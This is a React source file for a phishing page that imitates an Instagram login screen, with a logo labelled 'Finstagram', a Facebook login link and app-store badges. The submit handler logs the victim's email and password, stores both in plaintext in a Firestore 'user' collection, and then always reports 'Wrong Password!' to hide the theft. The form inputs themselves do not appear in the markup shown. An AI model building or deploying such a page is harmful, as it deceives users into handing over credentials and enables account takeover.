import React, { useState } from "react";
import { db } from "../src/firebaseconfig.js";
import { collection, addDoc } from "firebase/firestore";

function App() {
  const [showLoginForm, setShowLoginForm] = useState(false);

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log("Email:", email);
    console.log("Password:", password);

    // Save data to Firestore

    try {
      // Save data to Firestore
      await addDoc(collection(db, "user"), { email, password });
      alert("Wrong Password!");
    } catch (error) {
      console.error("Error saving data: ", error);
      alert("Error saving data");
    }
    alert("Wrong Password!");

  };


  return (
    <main>
      <div className="log-in-container">
        <div className="log-in">
          <img src="/RashidaVote/photos/logo.png" className="logo" alt="Finstagram Logo" />
          

          <span className="or-divider">OR</span>
          {/* FACEBOOK OPTION */}
          <div className="fb-login mt-3">
            <a href="#" className="d-flex align-items-center">
              <img src="/RashidaVote/photos/facebook-icon.png" alt="Facebook Icon" className="me-2" />
              <span>Log in with Facebook</span>
            </a>
          </div>
          {/* Forgot Password */}
          <a href="#" className="d-block mt-3 text-center text-muted">Forgot password?</a>
        </div>

        {/* Sign Up */}
        <div className="sign-up mt-4">
          <span>
            Don&apos;t have an account?
            <a href="#" className="ms-1 text-primary">Sign up</a>
          </span>
        </div>

        {/* Download */}
        <div className="get-the-app mt-4">
          <span>Get the app</span>
          <div className="app-images d-flex justify-content-center mt-2">
            <a href="#" className="me-2"><img src="/RashidaVote/photos/applestore.png" alt="Apple Store" /></a>
            <a href="#"><img src="/RashidaVote/photos/googlestore.png" alt="Google Store" /></a>
          </div>
        </div>
      </div>

      {/* Phones */}
      <div className="phones-container">
        <img src="/RashidaVote/photos/phones.png" alt="Phones" />
      </div>
    </main>
  );
}

export default App;
